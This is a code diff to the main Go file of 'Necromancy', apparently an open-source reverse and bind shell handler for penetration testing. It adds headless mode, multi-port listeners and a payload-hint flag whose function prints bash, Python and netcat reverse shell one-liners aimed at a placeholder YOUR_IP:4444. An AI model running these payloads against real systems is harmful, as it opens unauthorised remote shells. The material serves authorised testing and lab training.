@@ -5,13 +5,17 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"os/signal"
+	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/Aryma-f4/necromancy/core"
 	"github.com/Aryma-f4/necromancy/server"
 	"github.com/Aryma-f4/necromancy/ui"
 	"github.com/Aryma-f4/necromancy/updater"
+	"golang.org/x/term"
 )
 
 // Version variables - will be set by build flags
@@ -19,6 +23,56 @@ var (
 	Version   = "dev"
 	BuildDate = "unknown"
 )
+
+func splitPorts(raw string) []string {
+	var ports []string
+	for _, part := range strings.Split(raw, ",") {
+		part = strings.TrimSpace(part)
+		if part != "" {
+			ports = append(ports, part)
+		}
+	}
+	return ports
+}
+
+func showPayloads() {
+	fmt.Println("Available Reverse Shell Payloads:")
+	fmt.Println("")
+	fmt.Println("Bash:")
+	fmt.Println("bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
+	fmt.Println("")
+	fmt.Println("Python:")
+	fmt.Println(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`)
+	fmt.Println("")
+	fmt.Println("Netcat:")
+	fmt.Println("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f")
+}
+
+func shouldUseTUI(forceHeadless bool) bool {
+	if forceHeadless {
+		return false
+	}
+
+	if os.Getenv("TERM") == "" || os.Getenv("TERM") == "dumb" {
+		return false
+	}
+
+	return term.IsTerminal(int(os.Stdin.Fd())) && term.IsTerminal(int(os.Stdout.Fd()))
+}
+
+func runHeadless() {
+	fmt.Println("[i] Running in headless mode")
+	fmt.Println("[i] Suitable for VPS, tmux, systemd, nohup, and non-interactive shells")
+
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	for {
+		sig := <-sigChan
+		fmt.Printf("[i] Received signal %s, shutting down\n", sig.String())
+		return
+	}
+}
 
 func main() {
 	printColoredBanner()
@@ -44,6 +98,22 @@ func main() {
 	flag.BoolVar(&core.GlobalConfig.NoLog, "L", false, "Disable session log files")
 	flag.BoolVar(&core.GlobalConfig.NoUpgrade, "U", false, "Disable shell auto-upgrade")
 	flag.BoolVar(&core.GlobalConfig.OSCPSafe, "O", false, "Enable OSCP-safe mode")
+	flag.IntVar(&core.GlobalConfig.WebPort, "w", 8000, "HTTP server port")
+	flag.StringVar(&core.GlobalConfig.URLPrefix, "prefix", "", "HTTP file server URL prefix")
+	flag.BoolVar(&core.GlobalConfig.SingleSession, "S", false, "Accept only the first created session")
+	flag.BoolVar(&core.GlobalConfig.NoAttach, "C", false, "Do not auto-attach on new sessions")
+
+	var showPayloadHints bool
+	var showInterfaces bool
+	var showVersion bool
+	var headless bool
+	flag.BoolVar(&showPayloadHints, "a", false, "Show sample reverse shell payloads")
+	flag.BoolVar(&showPayloadHints, "payloads", false, "Show sample reverse shell payloads")
+	flag.BoolVar(&showInterfaces, "l", false, "List available network interfaces")
+	flag.BoolVar(&showInterfaces, "interfaces", false, "List available network interfaces")
+	flag.BoolVar(&showVersion, "v", false, "Print version and exit")
+	flag.BoolVar(&showVersion, "version", false, "Print version and exit")
+	flag.BoolVar(&headless, "headless", false, "Run without TUI for VPS/non-interactive environments")
 
 	// Auto-update flags
 	var checkUpdate bool
@@ -68,6 +138,21 @@ func main() {
 		os.Exit(0)
 	}
 
+	if showVersion {
+		fmt.Printf("Necromancy %s\n", Version)
+		os.Exit(0)
+	}
+
+	if showInterfaces {
+		fmt.Print(core.GetInterfaces())
+		os.Exit(0)
+	}
+
+	if showPayloadHints {
+		showPayloads()
+		os.Exit(0)
+	}
+
 	// Setup logging to file since stdout is used by tview
 	f, err := os.OpenFile("necromancy-go.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
@@ -82,26 +167,41 @@ func main() {
 
 	// Start HTTP File Server if requested
 	if core.GlobalConfig.ServeDir != "" {
-		fs := server.NewFileServer(core.GlobalConfig.Interface+":8000", core.GlobalConfig.ServeDir)
+		fsAddr := core.GlobalConfig.Interface + ":" + strconv.Itoa(core.GlobalConfig.WebPort)
+		fs := server.NewFileServer(fsAddr, core.GlobalConfig.ServeDir, core.GlobalConfig.URLPrefix)
 		go fs.Start()
 	}
 
-	// Initialize and run the Tview UI
-	app := ui.NewApp(sessions)
+	useTUI := shouldUseTUI(headless)
+	var app *ui.App
+	if useTUI {
+		app = ui.NewApp(sessions)
+	}
 
 	// Handle Listeners or Bind Shell connections
 	if core.GlobalConfig.Connect != "" {
-		target := fmt.Sprintf("%s:%s", core.GlobalConfig.Connect, core.GlobalConfig.Ports)
-		go core.ConnectBind(target, sessions, func(s *core.Session) {
-			log.Printf("New Bind Session %d from %s\n", s.ID, s.RemoteAddr)
-			app.UpdateSessionsList()
-		})
+		for _, port := range splitPorts(core.GlobalConfig.Ports) {
+			target := fmt.Sprintf("%s:%s", core.GlobalConfig.Connect, port)
+			go core.ConnectBind(target, sessions, func(s *core.Session) {
+				log.Printf("New Bind Session %d from %s\n", s.ID, s.RemoteAddr)
+				if app != nil {
+					app.UpdateSessionsList()
+				}
+			})
+			fmt.Printf("[i] Connecting to bind shell at %s\n", target)
+		}
 	} else {
-		// Default reverse shell listener
-		go core.StartListener(core.GlobalConfig.Interface+":"+core.GlobalConfig.Ports, sessions, func(s *core.Session) {
-			log.Printf("New Reverse Session %d from %s\n", s.ID, s.RemoteAddr)
-			app.UpdateSessionsList()
-		})
+		// Reverse shell listeners
+		for _, port := range splitPorts(core.GlobalConfig.Ports) {
+			listenerAddr := core.GlobalConfig.Interface + ":" + port
+			go core.StartListener(listenerAddr, sessions, func(s *core.Session) {
+				log.Printf("New Reverse Session %d from %s\n", s.ID, s.RemoteAddr)
+				if app != nil {
+					app.UpdateSessionsList()
+				}
+			})
+			fmt.Printf("[i] Listening on %s for reverse shells\n", listenerAddr)
+		}
 	}
 
 	// Session Persistence Logic
@@ -121,6 +221,15 @@ func main() {
 			}
 		}()
 	}
+
+	if !useTUI {
+		runHeadless()
+		fmt.Println("Necromancy Go Exited cleanly.")
+		return
+	}
+
+	fmt.Println("[i] Starting terminal UI...")
+	fmt.Println("[i] Press 'h' for help, 'q' to quit")
 
 	app.Setup()
 
